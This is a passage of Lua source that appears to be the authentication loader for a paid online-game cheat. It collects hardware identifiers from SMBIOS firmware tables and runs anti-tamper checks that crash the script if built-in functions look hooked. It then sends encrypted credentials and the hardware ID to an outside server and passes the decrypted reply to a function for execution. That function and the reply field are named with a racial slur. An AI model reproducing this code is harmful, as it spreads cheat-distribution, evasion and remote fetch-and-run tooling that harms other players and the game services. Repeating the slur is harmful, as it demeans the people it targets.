        UINT16	PhysicalArrayHandle;
        UINT16	ErrorInformationHandle;
        UINT16	TotalWidth;
        UINT16	DataWidth;
        UINT16	Size;
        UCHAR	FormFactor;
        UCHAR	DeviceSet;
        UCHAR	DeviceLocator;
        UCHAR	BankLocator;
        UCHAR	MemoryType;
        UINT16	TypeDetail;
        UINT16	Speed;
        UCHAR	Manufacturer;
        UCHAR	SN;
        UCHAR	AssetTag;
        UCHAR	PN;
        UCHAR	Attributes;
        } MemoryDevice, *PMemoryDevice;
    ]]
end

local BCLib = ffi.load("Bcrypt.dll");
local rand_buff = ffi.new("unsigned char[4]")
BCLib.BCryptGenRandom(nil, rand_buff, 4, 2)
local rand1 = ffi.cast("unsigned int*", rand_buff)[0]
local rand2 = ffi.C.rand()

local static_key = 79345;
local static_key2 = 5328;

local random_key = bit.bxor(math.random(99999999), rand1, rand2) % 0x9249249;
local inv256

local function encrypt(str, key1, key2)
    if not inv256 then
        inv256 = {}
        for M = 0, 127 do
            local inv = -1
            repeat inv = inv + 2
            until inv * (2 * M + 1) % 256 == 1
            inv256[M] = inv
        end
    end
    local K, F = key1, 16384 + key2
    return (str:gsub('.', function(m)
        local L = K % 274877906944
        local H = (K - L) / 274877906944
        local M = H % 128
        m = m:byte()
        local c = (m * inv256[M] - (H - M) / 128) % 256
        K = L * F + H + c + m
        return ('%02x'):format(c)
    end))
end

local function decrypt(str, key1, key2)
    local K, F = key1, 16384 + key2
    return (str:gsub('%x%x',
            function(c)
                local L = K % 274877906944
                local H = (K - L) / 274877906944
                local M = H % 128
                c = tonumber(c, 16)
                local m = (c + (H - M) / 128) * (2 * M + 1) % 256
                K = L * F + H + c + m
                return string.char(m)
            end
    ))
end

local function lynxEncode(str, key1, key2)
    return encrypt(str, key1, key2);
end

local function lynxDecode(str, key1, key2)
    return decrypt(str, key1, key2);
end

local function getHWID()
    local RSMB = 0x52534d42
    local needBufferSize = kernel32.GetSystemFirmwareTable(RSMB, 0, nil, 0)
    local buf = ffi.new("BYTE[?]", needBufferSize)
    needBufferSize = kernel32.GetSystemFirmwareTable(RSMB, 0, buf, needBufferSize)

    local pDMIData = ffi.cast("PRawSMBIOSData", buf)
    local nTableLength = pDMIData.Length

    local offset = ffi.offsetof("RawSMBIOSData", "SMBIOSTableData")
    local pHeader = ffi.cast("PSMBIOSHEADER", buf + offset)
    local data = {}

    while true do
        if pHeader.Type == 127 and pHeader.Length == 4 then
            break
        end --last available table

        if pHeader.Type < 5 or pHeader.Type == 17 then
            local strings_offset = offset + pHeader.Length

            local function getStr(i)
                if i == 0 then
                    return ""
                end
                local o = strings_offset
                i = i - 1
                while i > 0 do
                    o = o + ffi.C.strlen(ffi.cast("const char*", buf + o)) + 1
                    i = i - 1
                end
                return ffi.string(buf + o)
            end

            if pHeader.Type == 0 then
                local pBIOS = ffi.cast("PBIOSInfo", buf + offset)
                table.insert(data, getStr(pBIOS.Vendor))
            elseif pHeader.Type == 1 then
                local pSystem = ffi.cast("PSystemInfo", buf + offset)
                table.insert(data, getStr(pSystem.Manufacturer))
                table.insert(data, getStr(pSystem.ProductName))
                table.insert(data, getStr(pSystem.SN))
            elseif pHeader.Type == 2 then
                local pBoard = ffi.cast("PBoardInfo", buf + offset)
                table.insert(data, getStr(pBoard.Manufacturer))
                table.insert(data, getStr(pBoard.Product))
                table.insert(data, getStr(pBoard.SN))
            elseif pHeader.Type == 4 then
                local pProcessor = ffi.cast("PProcessorInfo", buf + offset)
                table.insert(data, getStr(pProcessor.SocketDesignation))
                table.insert(data, getStr(pProcessor.Type))
                table.insert(data, getStr(pProcessor.Version))
            elseif pHeader.Type == 17 then
                local pMemory = ffi.cast("PMemoryDevice", buf + offset)
                table.insert(data, getStr(pMemory.Manufacturer))
                table.insert(data, getStr(pMemory.SN))
                table.insert(data, getStr(pMemory.PN))
            end
        end

        offset = offset + pHeader.Length
        local br = false
        while ffi.cast("PBYTE", buf + offset)[0] ~= 0 or ffi.cast("PBYTE", buf + offset + 1)[0] ~= 0 do
            offset = offset + 1
            if offset >= nTableLength then
                br = true
                break
            end
        end
        offset = offset + 2
        if offset >= nTableLength or br then
            break
        end

        pHeader = ffi.cast("PSMBIOSHEADER", buf + offset)
    end

    return table.concat(data, ";")
end

--ffi.string(vtable_bind("vgui2.dll", "VGUI_System010", 32, "char *(__thiscall*)(void*)")());
local username, password = '%username%', '%pass_hash%';
-- if (true) then
--username, password = "Rab", "$2y$10$KsXXd8zQVceZk6F6bn6VeusMRujuupV9DjrwqOV5A3wudG4O3QcIq";
-- end

--[[ ============ START API FUNCTIONS ================ ]]


local function getFileLength(name)
    local tempFile;
    pcall(function()
        tempFile = file.Open(name, "r");
    end)
    -- Create file if not exists
    if (tempFile == nil) then
        tempFile = file.Open(name, "w");
        tempFile:Close();
        tempFile = file.Open(name, "r");
    end
    local data = tempFile:Size();
    tempFile:Close();
    return data;
end

local path, version = GetScriptName(), '%version%';
local fileLength = getFileLength(path);
local startTime = tostring(common.Time());

-- Anti Spoof Checks
do

    local _, error = pcall(function()
        error(1)
    end)
    local real_script_name = string.match(error, "^(.*%.lua):")
    if real_script_name ~= path then
        fileLength = fileLength + 69;
        print("real_script_name")
        timer.Create("bye", 15, 1, crashScript)
    end

    local checks = {
        { 'tostring', 18 },
        { 'assert', 2 },
        { 'tonumber', 17 },
        { 'load', 23 },
        { 'loadstring', 24 }
    }

    for i = 1, #checks do
        local str, func = checks[i][1], _G;
        for token in string.gmatch(str, "[^%.]+") do
            func = func[token];
        end
        if (not string.find(_G[checks[1][1]](func), (checks[i][2])) or pcall(string.dump, func)) then
            print('error 0x', checks[i][2]);
            timer.Create("bye", 15, 1, crashScript)
            fileLength = fileLength + 69;
        end
    end

    local checks2 = {
        { 'loadstring', loadstring },
        { 'load', load },
    }

    for i = 1, #checks2 do
        local str, func = checks2[i][1], checks2[i][2];
        if (_G[str] ~= func) then
            print('error 1x', i);
            timer.Create("bye", 15, 1, crashScript)
            fileLength = fileLength + 69;
        end
    end

    local stringAPIS = {
        { 'find', 86 },
        { 'rep', 81 },
        { 'format', 91 },
        { 'gsub', 90 },
        { 'gmatch', 89 },
        { 'match', 87 },
        { 'reverse', 82 },
        { 'byte', 78 },
        { 'char', 79 },
        { 'upper', 84 },
        { 'lower', 83 },
        { 'sub', 80 },
        { 'dump', 85 }
    }

    for i = 1, #stringAPIS do
        local str, func = stringAPIS[i][1], _G['string'];
        for token in string.gmatch(str, "[^%.]+") do
            func = func[token];
        end
        if (not string.find(tostring(func), (stringAPIS[i][2])) or pcall(string.dump, func)) then
            print('error 2x', stringAPIS[i][2], tostring(func));
            timer.Create("bye", 15, 1, crashScript)
            fileLength = fileLength + 69;
        end
    end

    local ffiAPIs = {
        { 'new', 188 },
        { 'cast', 189 },
        { 'typeof', 190 },
        { 'sizeof', 192 },
        { 'alignof', 193 },
        { 'istype', 191 },
        { 'fill', 198 },
        { 'cdef', 187 },
        { 'abi', 199 },
        { 'metatype', 200 },
        { 'copy', 197 },
        -- { 'typeinfo', 128 },
        { 'string', 196 },
        { 'gc', 201 },
        { 'errno', 195 },
        { 'offsetof', 194 }
    }

    for i = 1, #ffiAPIs do
        local str, func = ffiAPIs[i][1], ffi;
        for token in string.gmatch(str, "[^%.]+") do
            func = func[token];
        end
        if (not string.find(tostring(func), (ffiAPIs[i][2])) or pcall(string.dump, func)) then
            print('error 3x', ffiAPIs[i][2], tostring(func));
            timer.Create("bye", 15, 1, crashScript)
            fileLength = fileLength + 69;
        end
    end

    local mathAPIs = {
        { 'ceil', 39 },
        { 'tan', 45 },
        { 'log10', 41 },
        { 'randomseed', 64 },
        { 'cos', 44 },
        { 'sinh', 49 },
        { 'random', 63 },
        { 'max', 62 },
        { 'atan2', 57 },
        { 'ldexp', 60 },
        { 'floor', 38 },
        { 'sqrt', 40 },
        { 'atan', 48 },
        { 'fmod', 59 },
        { 'acos', 47 },
        { 'pow', 58 },
        { 'abs', 37 },
        { 'min', 61 },
        { 'sin', 43 },
        { 'frexp', 52 },
        { 'log', 56 },
        { 'tanh', 51 },
        { 'exp', 42 },
        { 'modf', 53 },
        { 'cosh', 50 },
        { 'asin', 46 },
    }
    for i = 1, #mathAPIs do
        local str, func = mathAPIs[i][1], math;
        for token in string.gmatch(str, "[^%.]+") do
            func = func[token];
        end
        if (not string.find(tostring(func), (mathAPIs[i][2]))) then
            print('error 4x', mathAPIs[i][2], tostring(func));
            timer.Create("bye", 15, 1, crashScript)
            fileLength = fileLength + 69;
        end
    end
end

local postData = lynxEncode(json.stringify({
    ['k'] = random_key,
    ['username'] = username,
    ['password'] = password,
    ['hwid'] = getHWID(),
    ['startTime'] = startTime,
    ['length'] = fileLength,
    ['version'] = version,
    ['uid'] = cheat.GetUserID(),
}), static_key, static_key2);

if _G['_DEBUG'] then
    timer.Create("main", 0.1, 1, protected)
else
    http.Get("https://vacban.gay/?sex=" .. postData, function(data)
        local decrypted = decrypt(data, static_key, random_key)
        local status, value = pcall(json.parse, decrypted)
        if status then
            if value.success then
                local status, err = pcall(function()
                    nigger(value["nigger"])
                end);
                if(err) then
                    print(err);
                end
            else
                print(value.error)
            end
        else
            print("error 0x5C90D13");
        end
    end)
end

callbacks.Register("Draw", function()
    timer.Tick()
end)
